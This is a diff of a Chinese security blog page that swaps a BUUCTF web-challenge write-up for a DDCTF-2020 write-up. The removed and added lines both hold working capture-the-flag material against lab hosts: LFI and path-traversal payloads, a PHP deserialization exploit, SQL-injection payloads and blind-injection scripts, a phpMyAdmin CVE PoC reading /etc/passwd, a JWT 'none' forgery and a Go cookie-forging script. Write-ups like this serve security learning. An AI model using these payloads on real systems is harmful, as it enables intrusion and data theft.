@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">BUU(3)-wp | Cupid&#39;s Blog</title>
+  <title itemprop="name">DDCTF-2020 | Cupid&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -354,7 +354,7 @@
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      BUU(3)-wp</h1>
+      DDCTF-2020</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -380,332 +380,76 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <!-- toc -->
+          <h2><span id="卡片商店">卡片商店</span></h2><p>考点:整数溢出</p>
+<p>go语言的cookie伪造</p>
+<p>打开页面后是这样的:</p>
+<p><img src="/2020/09/15/DDCTF-2020/1.png" alt="1"></p>
+<p>这个思路就是借超过最大上限的卡片导致溢出然后再把借记条换了就能有很多张卡片兑换礼物。</p>
+<p>先点击向朋友借:</p>
+<p><img src="/2020/09/15/DDCTF-2020/2.PNG" alt="image-20200907113500879"></p>
+<p>然后输入9999999999999(任意足够大数字就可)</p>
+<p><img src="/2020/09/15/DDCTF-2020/3.PNG" alt="image-20200907113539625"></p>
+<p>然后只需要换1316134913张卡片</p>
+<p>点几下刷新卡片，就会还掉借记卡最后点击兑换礼物。</p>
+<p>兑换到的礼物就是伪造cookie的key：</p>
+<p><img src="/2020/09/15/DDCTF-2020/4.PNG" alt="image-20200907113239282"></p>
+<p>然后我们进入到flag界面:</p>
+<p>会提示不是幸运用户。</p>
+<p>然后抓包发现cookie疑似是base64加密。</p>
+<p>对其进行解密:</p>
+<p><img src="/2020/09/15/DDCTF-2020/5.PNG" alt="image-20200907113840538"></p>
+<p>发现上面出现可疑的admin bool</p>
+<p>应该是要转换成true。</p>
+<p>到这儿不知道该怎么利用给的key了。</p>
+<p>然后最后笑师傅说到去搜索cookie解码的关键字:</p>
+<p><img src="/2020/09/15/DDCTF-2020/6.PNG" alt="image-20200907114017713"></p>
+<p>最后就是研究go语言的cookie产生过程了。</p>
+<p>最最后:</p>
+<p>伪造cookie的脚本(笑师傅写的):</p>
+<pre><code class="go">package main
 
-<ul>
-<li><a href="#bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day</a></li>
-<li><a href="#npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP</a></li>
-<li><a href="#网鼎杯-2018comment">[网鼎杯 2018]Comment</a></li>
-<li><a href="#bjdctf-2nd简单注入">[BJDCTF 2nd]简单注入</a></li>
-<li><a href="#gwctf-2019我有一个数据库">[GWCTF 2019]我有一个数据库</a></li>
-<li><a href="#bsidescf-2019kookie">[BSidesCF 2019]Kookie</a></li>
-<li>[Day2 Web1]Easyweb](#day2-web1easyweb)</li>
-<li><a href="#hfctf2020easylogin">[HFCTF2020]EasyLogin</a></li>
-</ul>
-<!-- tocstop -->
+//go get github.com/gorilla/sessions
+import &quot;github.com/gorilla/securecookie&quot;
+import &quot;fmt&quot;
 
-<h2><span id="bsidescf-2020had-a-bad-day">[BSidesCF 2020]Had a bad day</span></h2><p>进入页面后就两个按钮，按了之后url分别是:</p>
-<pre><code class="url">http://ed8e3ed8-e966-44c5-b917-7cfb4c276d9f.node3.buuoj.cn/index.php?category=woofers
-http://ed8e3ed8-e966-44c5-b917-7cfb4c276d9f.node3.buuoj.cn/index.php?category=meowers</code></pre>
-<p>查看源代码发现:</p>
-<p><img src="/2020/09/15/BUU-3-wp/1.png" alt="1"></p>
-<p>看到value就try了下xss,传入woofers”</p>
-<p>出现报错:</p>
-<pre><code class="html">&lt;b&gt;Warning&lt;/b&gt;:  include(woofers&amp;quot;.php): failed to open stream: No such file or directory in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;37&lt;/b&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;b&gt;Warning&lt;/b&gt;:  include(): Failed opening &#39;woofers&amp;quot;.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;37&lt;/b&gt;&lt;br /&gt;</code></pre>
-<p>一眼就看到了include函数说明存在文件包含漏洞。</p>
-<p>那就读一下源码吧:</p>
-<p>category=php://filter/read=convert.base64-encode/resource=index</p>
-<p>这里由于其本身代码应该是</p>
-<pre><code class="php">include($_GET[&#39;category&#39;].&#39;php&#39;);</code></pre>
-<p>所以无需再传入php.</p>
-<p>然后base64解码:</p>
-<pre><code class="php">index.php
-              &lt;?php
-                $file = $_GET[&#39;category&#39;];
+var hashKey = []byte(&quot;Udc13VD5adM_c10nPxFu@v12&quot;)
+var s = securecookie.New(hashKey, nil)
 
-                if(isset($file))
-                {
-                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){
-                        include ($file . &#39;.php&#39;);
-                    }
-                    else{
-                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;
-                    }
-                }
-                ?&gt;
-</code></pre>
-<p>仔细看代码逻辑只能包含三个页面，woofers、meowers、index</p>
-<p>接下来尝试利用目录穿越读取flag：</p>
-<p>woofers../../flag</p>
-<p>然后在源代码中发现:</p>
-<p><img src="/2020/09/15/BUU-3-wp/2.png" alt="2"></p>
-<p>这里仔细读代码会发现只要传入的参数中含有woofers、meowers、index即可读取到源代码。</p>
-<p>那就用目录穿越直接读:</p>
-<pre><code class="php">payload：
-category=php://filter/read=convert.base64-encode/resource=woofers../../flag</code></pre>
-<p>最后将base64解码即可:</p>
-<p><img src="/2020/09/15/BUU-3-wp/3.png" alt="3"></p>
-<h2><span id="npuctf2020readlezphp">[NPUCTF2020]ReadlezPHP</span></h2><pre><code class="php">查看源代码发现存在接口:
-./time.php?source
-访问发现源代码:
-&lt;?php
-#error_reporting(0);
-class HelloPhp
-{
-    public $a;
-    public $b;
-    public function __construct(){
-        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;
-        $this-&gt;b = &quot;date&quot;;
-    }
-    public function __destruct(){
-        $a = $this-&gt;a;
-        $b = $this-&gt;b;
-        echo $b($a);
-    }
-}
-$c = new HelloPhp;
-
-if(isset($_GET[&#39;source&#39;]))
-{
-    highlight_file(__FILE__);
-    die(0);
+func main() {
+  encode()
 }
 
-@$ppp = unserialize($_GET[&quot;data&quot;]);
+func encode(){
+  value := map[interface{}]interface{} {&quot;admin&quot;:true,&quot;wallet&quot;:&quot;{\&quot;owings\&quot;:[],\&quot;invests\&quot;:[],\&quot;money\&quot;:996432412472,\&quot;now_time\&quot;:1599208994,\&quot;start_time\&quot;:1599208954}&quot;}
 
-
-2020-08-23 04:28:57</code></pre>
-<p>最基础的反序列化了，这里主要想一哈怎么拿flag：</p>
-<pre><code class="php">一般都喜欢放phpinfo里面构造:assert(phpinfo();)
-exp：
-&lt;?php
-class HelloPhp
-{
-    public $a;
-    public $b;
-    public function __construct(){
-        $this-&gt;a = &quot;Y-m-d h:i:s&quot;;
-        $this-&gt;b = &quot;date&quot;;
-    }
-    public function __destruct(){
-        $a = $this-&gt;a;
-        $b = $this-&gt;b;
-        echo $b($a);
-    }
+  encoded, err := s.Encode(&quot;session&quot;, value)
+  if err == nil {
+    fmt.Println(encoded)
+  }else{
+    fmt.Println(err)
+  }
 }
 
-$test = new HelloPhp();
-$test-&gt;b = &#39;assert&#39;;
-$test-&gt;a = &#39;phpinfo();&#39;;
+func decode(){
+  value := make(map[interface{}]interface{})
+  var err error
 
-echo serialize($test);
-
-
-?&gt;
-最后生成:O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}
-然后访问data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}</code></pre>
-<p>最后看到phpinfo页面ctrl+f搜索flag就找到了。</p>
-<h2><span id="网鼎杯-2018comment">[网鼎杯 2018]Comment</span></h2><p>这个题受益良多，主要是git扫出来了但代码只有一小节:</p>
-<p>需要如下命令恢复:</p>
-<pre><code>cd 到githacker生成的目录下
-git log --reflog
-git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c //这一串是第一个commit出来的一串</code></pre><p>最后得到完整的代码:</p>
-<pre><code class="php">&lt;?php
-include &quot;mysql.php&quot;;
-session_start();
-if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){
-    header(&quot;Location: ./login.php&quot;);
-    die();
-}
-if(isset($_GET[&#39;do&#39;])){
-switch ($_GET[&#39;do&#39;])
-{
-case &#39;write&#39;:
-    $category = addslashes($_POST[&#39;category&#39;]);
-    $title = addslashes($_POST[&#39;title&#39;]);
-    $content = addslashes($_POST[&#39;content&#39;]);
-    $sql = &quot;insert into board
-            set category = &#39;$category&#39;,
-                title = &#39;$title&#39;,
-                content = &#39;$content&#39;&quot;;
-    $result = mysql_query($sql);
-    header(&quot;Location: ./index.php&quot;);
-    break;
-case &#39;comment&#39;:
-    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);
-    $sql = &quot;select category from board where id=&#39;$bo_id&#39;&quot;;
-    $result = mysql_query($sql);
-    $num = mysql_num_rows($result);
-    if($num&gt;0){
-    $category = mysql_fetch_array($result)[&#39;category&#39;];
-    $content = addslashes($_POST[&#39;content&#39;]);
-    $sql = &quot;insert into comment
-            set category = &#39;$category&#39;,
-                content = &#39;$content&#39;,
-                bo_id = &#39;$bo_id&#39;&quot;;
-    $result = mysql_query($sql);
-    }
-    header(&quot;Location: ./comment.php?id=$bo_id&quot;);
-    break;
-default:
-    header(&quot;Location: ./index.php&quot;);
-}
-}
-else{
-    header(&quot;Location: ./index.php&quot;);
-}
-?&gt;</code></pre>
-<p> 然后读history文件：/home/www/.bash_history</p>
-<p>发现存在.DS_store文件</p>
-<p>然后读取它会发现长度不高，所以hex编码显示</p>
-<pre><code class="mysql">payload: &#39;, content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></pre>
-<p>把查出来的hex转成string发现存在:</p>
-<pre><code>flag_8946e1ff1ee3e40f.php</code></pre><p>最后直接读取</p>
-<p>最后:</p>
-<pre><code>payload：
-&#39;, content=(select load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;)),/*</code></pre><p>然后进去后提交留言:</p>
-<pre><code>*/#闭合语句达到注入</code></pre><p>最后ctrl+u源码即可看到flag</p>
-<h2><span id="bjdctf-2nd简单注入">[BJDCTF 2nd]简单注入</span></h2><p>进入页面是一个登录框，先扫描目录发现hint.txt</p>
-<pre><code>Only u input the correct password then u can get the flag
-and p3rh4ps wants a girl friend.
-
-select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;
-
-//出题人四级压线才过 见谅见谅 领会精神</code></pre><p>输入用户名密码抓包如下:</p>
-<p>加上单引号:</p>
-<p><img src="/2020/09/15/BUU-3-wp/4.png" alt="4"></p>
-<p>仔细看提示的sql注入尝试绕过单引号注入:</p>
-<pre><code class="mysql">select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;
-可以看到用户名和密码在同一个语句中，单引号用不了的话就只能将两个部分联通来闭合然后在中间部分执行sql语句。
-具体实现:
-username=admin\
-password=^+sleep(5)#
-这样sql语句就变成了:
-select * from users where username=&#39;admin\&#39; and password=&#39;^ sleep(5)#&#39;;
-相当于:select * from users where username=&#39;admin and password=&#39;^ sleep(5)
-这样执行的sql语句就拼接到了整个查询语句后面就可以执行了。后面就是爆password字段了。</code></pre>
-<p><img src="/2020/09/15/BUU-3-wp/5.png" alt="5"></p>
-<p>payload：</p>
-<pre><code>username=admin\
-password=^(ascii(substr(password,{},1))&gt;{})#</code></pre><p>尝试编写脚本:</p>
-<p>在此之前需要判断出页面的正常回显</p>
-<pre><code>username=admin\&amp;password=^+(ascii(substr(password,1,1))&gt;10000000)#</code></pre><p>发现页面显示:BJD needs to be stronger</p>
-<p>那么就可以用关键字stronger来盲注:</p>
-<p>真实编写代码的时候发现使用^的方式不能够连接后面的语句，于是还是用or来爆:</p>
-<p>参考的网上某大哥的二分法，比直接挨着跑快得多。</p>
-<pre><code class="python">exp.py
-import requests
-url = &quot;http://860894fe-d16f-49f4-a38f-c3d2a66ddcfa.node3.buuoj.cn/index.php&quot;
-
-data = {&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}
-result = &quot;&quot;
-i = 0
-
-while( True ):
-    i = i + 1
-    head=32
-    tail=127
-
-    while( head &lt; tail ):
-        mid = (head + tail) &gt;&gt; 1
-
-        payload = &quot;or+if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;%(i,mid)
-
-        data[&#39;password&#39;] = payload
-        r = requests.post(url,data=data)
-
-        if &quot;stronger&quot; in r.text :
-            head = mid + 1
-        else:
-            tail = mid
-
-
-    if head!=32:
-        result += chr(head)
-    else:
-        break
-    print(result)</code></pre>
-<p>最后password=OhyOuFOuNdit</p>
-<p>登陆admin/OhyOuFOuNdit</p>
-<p>即可拿到flag.</p>
-<h2><span id="gwctf-2019我有一个数据库">[GWCTF 2019]我有一个数据库</span></h2><p>考点:phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</p>
-<p>直接poc打:</p>
-<pre><code>/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../etc/passwd
-/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag</code></pre><h2><span id="bsidescf-2019kookie">[BSidesCF 2019]Kookie</span></h2><p>考点很简单，考的不安全的身份验证。</p>
-<p>直接把用户名放入cookie中作为登陆凭证，改为admin直接拿到flag.</p>
-<h2><span id="day2-web1easyweb">Day2 Web1]Easyweb</span></h2><p>访问目录存在robots.txt</p>
-<p>发现robots.txt给了提示*.php.bak</p>
-<p>最后fuzz出来是image.</p>
-<p>下载下来代码如下:</p>
-<pre><code class="php">&lt;﻿?php
-include &quot;config.php&quot;;
-
-$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;
-$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;
-
-$id=addslashes($id);
-$path=addslashes($path);
-
-$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
-$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);
-
-$result=mysqli_query($con,&quot;select * from images where id=&#39;{$id}&#39; or path=&#39;{$path}&#39;&quot;);
-$row=mysqli_fetch_array($result,MYSQLI_ASSOC);
-
-$path=&quot;./&quot; . $row[&quot;path&quot;];
-header(&quot;Content-Type: image/jpeg&quot;);
-readfile($path);</code></pre>
-<p>漏洞出现在:</p>
-<pre><code class="php">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);
-这里假如我们传入\\0作为id那么sql语句就变成了。
-
-$result=mysqli_query($con,&quot;select * from images where id=&#39;\&#39; or path=&#39;{$path}&#39;&quot;);
-而这个\会使得id中右边的单引号失效，因而也可以成功闭合来执行我们的连接sql语句。
-这里代码中没有输出位所以可以用bool盲注。
-但后续检查发现自己的传入不对
-当传入\\0会导致第一个\被转义而无法转义后面的单引号。
-</code></pre>
-<p>本地测试了一下:</p>
-<p><img src="/2020/09/15/BUU-3-wp/7.png" alt="7"></p>
-<p><img src="/2020/09/15/BUU-3-wp/8.png" alt="8"></p>
-<p>这样就相当于是双斜杠导致并没能转义后面的单引号。</p>
-<p>这里我接着尝试输入\0’</p>
-<p><img src="/2020/09/15/BUU-3-wp/9.png" alt="9"></p>
-<p>这次最终得到的是\</p>
-<p>接下来回到题目测试sql注入存在性:</p>
-<p>payload：</p>
-<pre><code>image.php?id=\0%27&amp;path=+or+sleep(5)%23</code></pre><p>sleep成功执行</p>
-<p>接下来就很简单的，直接套用的以前的bool盲注的二分法跑。</p>
-<p>这里还需要注意的是，盲注判断正确的时候页面是一个猫的图片，不正确是什么都没有。</p>
-<p>因而判断页面内容需要采用:</p>
-<p><img src="/2020/09/15/BUU-3-wp/10.png" alt="10"></p>
-<p>exp编写如下:</p>
-<pre><code class="python">import requests
-import time
-name=&#39;&#39;
-for j in range(1,21):
-    l = 32
-    h = 127
-    while abs(l-h)&gt;1:
-        i=int((l+h)/2)
-        url=&quot;http://9feb78bd-e27d-4ef9-8ff6-88da1515f89c.node3.buuoj.cn/image.php?id=\\0&#39;&amp;path= or ascii(substr((select password from users),&quot;+str(j)+&quot;,1))&gt;&quot;+str(i)+&quot;%23&quot;
-        r = requests.get(url)
-        time.sleep(0.005)
-        if r.status_code==&#39;429&#39;:
-            print(&#39;to fast&#39;)
-        if not &#39;Content-Length&#39; in r.headers:
-            l = i
-        else:
-            h = i
-    name += chr(h)
-print(name)</code></pre>
-<h2><span id="hfctf2020easylogin">[HFCTF2020]EasyLogin</span></h2><p>考点jwt加密方式none绕过验证。</p>
-<pre><code class="php">exp.php
-&lt;?php
-$a = ‘{&quot;alg&quot;:&quot;none&quot;,&quot;typ&quot;:&quot;JWT&quot;}‘;
-$b = ‘{&quot;secretid&quot;:[],&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;123456&quot;,&quot;iat&quot;:1590582025}‘;
-echo base64_encode($a);
-echo &quot;\n&quot;;
-echo base64_encode($b);
-#eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=
-#eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU5MDU4MjAyNX0=
-?&gt;</code></pre>
-<p>最后登陆时候post：</p>
-<pre><code>username=admin&amp;password=123456&amp;authorization=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMzQ1NiIsImlhdCI6MTU5MDU4MjAyNX0.</code></pre><p>最后这个.应该是要连接加密密钥的部分，这儿由于加密方式为None所以不需要密码但仍然需要满足格式。</p>
-<p>最后成功伪造admin登陆然后就是收flag了。进入api,抓包发包即可看到flag</p>
+  if err = s.Decode(&quot;session&quot;, &quot;MTU5OTIwOTAzNHxEdi1CQkFFQ180SUFBUkFCRUFBQV81Yl9nZ0FDQm5OMGNtbHVad3dIQUFWaFpHMXBiZ1JpYjI5c0FnSUFBQVp6ZEhKcGJtY01DQUFHZDJGc2JHVjBCbk4wY21sdVp3eGZBRjE3SW05M2FXNW5jeUk2VzEwc0ltbHVkbVZ6ZEhNaU9sdGRMQ0p0YjI1bGVTSTZPVGsyTkRNeU5ERXlORGN5TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl3T0RrNU5Dd2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXdPRGsxTkgwPXyt-B6Jm23Kk8B5z2K_UKTx67JL4Qxam0wgJg3Oh7H38w==&quot;, &amp;value); err == nil {
+    fmt.Println(value)
+  }else{
+    fmt.Println(err)
+  }
+}</code></pre>
+<p>最后把生成的放cookie里再发包:</p>
+<p>最后flag：</p>
+<p><img src="/2020/09/15/DDCTF-2020/7.PNG" alt="image-20200907112850981"></p>
+<p>Easy Web</p>
+<p>进入页面后就只有一个登录框:</p>
+<p><img src="/2020/09/15/DDCTF-2020/8.PNG" alt="image-20200908101103795"></p>
+<p>随便输入账号登陆BP抓包发现:</p>
+<pre><code>响应包:
+Set-Cookie: rememberMe=deleteMe; Path=/6f0887622b5e34b5c9243f3ff42eb605/web; Max-Age=0;</code></pre><p>怀疑存在shiro反序列化漏洞。用小白工具打了打没反应。</p>
+<p>换最新的CVE上:<a href="https://l3yx.github.io/2020/06/30/Shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-CVE-2020-11989/" target="_blank" rel="noopener">笑师傅博客-需科学</a></p>
 
         </div>
         <!-- .entry-content -->
@@ -734,36 +478,19 @@ echo base64_encode($b);
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
+        
           
-            <div class="post-nepre half previous">
+            <div class="post-nepre full next">
           
-            <a href="/2020/09/15/DDCTF-2020/" rel="prev">
+            <a href="/2020/09/15/BUU-3-wp/" rel="next">
               <div class="background">
                 <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://api.btstu.cn/sjbz/?lx=dongman&method=pc&format=images&id=2020011101" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://api.btstu.cn/sjbz/?lx=dongman&method=pc&format=images&id=2020011101">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                DDCTF-2020</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
-        
-          
-            <div class="post-nepre half next">
-          
-            <a href="/2020/08/09/Sqli-labs/" rel="next">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                Sqli-labs</h3>
+                BUU(3)-wp</h3>
                 <hr>
               </div>
             </a>
